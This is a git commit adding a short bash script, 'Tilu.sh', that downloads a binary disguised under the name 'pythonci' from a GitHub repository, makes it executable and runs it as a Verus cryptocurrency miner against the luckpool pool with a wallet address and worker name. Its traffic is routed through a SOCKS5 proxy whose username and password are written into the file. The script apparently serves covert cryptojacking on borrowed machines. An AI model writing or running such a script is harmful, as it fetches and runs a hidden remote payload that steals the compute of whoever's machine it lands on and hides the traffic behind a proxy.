dea302cf9fe621a13e62ad623f7144c7940d8231
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-29 04:01:07 +0700

    Create Tilu.sh

---
+++ Tilu.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen -y
+sudo apt install screen libjansson4 -y
+wget https://github.com/uaaoxjdr/tesskepa/raw/main/pythonci
+chmod +x pythonci
+screen -dmS ls
+PL=stratum+tcp://na.luckpool.net:3956
+WT=RLW9aeQT9LVYYxpKtXRNdvh8H8HuTmPfg4
+WR=Keras
+PY=socks5://mxxbceyq:ie954kf96kht@45.87.243.174:6176
+./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
